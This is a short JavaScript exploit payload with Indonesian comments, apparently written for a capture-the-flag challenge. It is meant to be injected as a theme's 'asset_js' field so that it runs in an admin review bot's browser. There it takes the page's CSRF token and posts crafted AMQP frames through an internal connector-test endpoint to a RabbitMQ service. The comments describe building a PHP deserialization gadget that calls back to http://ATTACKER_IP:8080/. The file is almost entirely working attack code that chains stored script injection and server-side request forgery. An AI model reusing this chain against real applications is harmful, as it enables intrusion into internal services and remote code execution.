// payload.js — isi field "asset_js" saat membuat theme.
// Dijalankan di browser admin (origin challenge) setelah bot me-review theme.
//
// 1) generate gadget:  php gen_payload.php http://ATTACKER_IP:8080/
// 2) build AMQP frame: python3 build_amqp.py <payload_b64> > frames.json
// 3) tempel array dari frames.json ke segments_b64 di bawah.
(async () => {
  const { csrfToken: csrf, themeId } = window.__BOOTSTRAP__;

  const segments_b64 = [
    // "QU1RUAABAAEB...",
    // "CgAL...",
  ];

  await fetch(`/api/reviews/${themeId}/connector-test`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      csrf,
      host: "rabbitmq",
      port: 5672,
      segments_b64
    })
  }).catch(() => {});
})();
